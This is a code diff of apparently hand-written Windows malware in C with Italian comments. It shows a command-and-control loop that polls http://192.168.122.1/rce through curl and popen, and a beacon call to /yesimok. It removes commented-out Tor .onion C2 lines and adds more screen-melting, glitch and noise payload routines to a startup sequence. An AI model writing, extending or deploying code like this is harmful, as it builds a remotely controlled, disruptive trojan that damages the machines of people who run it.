@@ -350,7 +350,6 @@ void checkconn() {
     system("curl -s http://192.168.122.1:80/yesimok");
     printf(" --- yes im ok ---\n");
     Sleep(20000);
-    // system("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r");
 }
 
 void startfx() {
@@ -358,16 +357,22 @@ void startfx() {
     h = GetSystemMetrics(SM_CYSCREEN);
 
     //yeahhh starta a bestia!
+    whitenoise_sfx();
     heightglitch_run();
     widthglitch_run();
     tunnel_run();
     circleshake_run();
     ltunnel_run();
     squarefx_run();
+    squarewave_sfx(100, 1); // pompa 100hz belli quadrati negli sppikerrzz
+    pixelate();
+    lulu();
     fkngmelter();
+    predictablemelter();
     mtrfkngatombomb();
     squaryshapez();
     mtrfkngatombomb();
+    idlefx();
 }
 
 // MAI E DICO MAI settare duration su un valore minore di 1 anche se metti i float. Perche' le moltiplicazioni si sminchiano.
@@ -535,7 +540,6 @@ int main() {
     while(1) {
         printf("Clean\n");
         char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
-        //FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
         FILE *pointertotextstream = popen("curl -s http://192.168.122.1:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output (SOLO LA PRIMA RIGA)
 
         if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
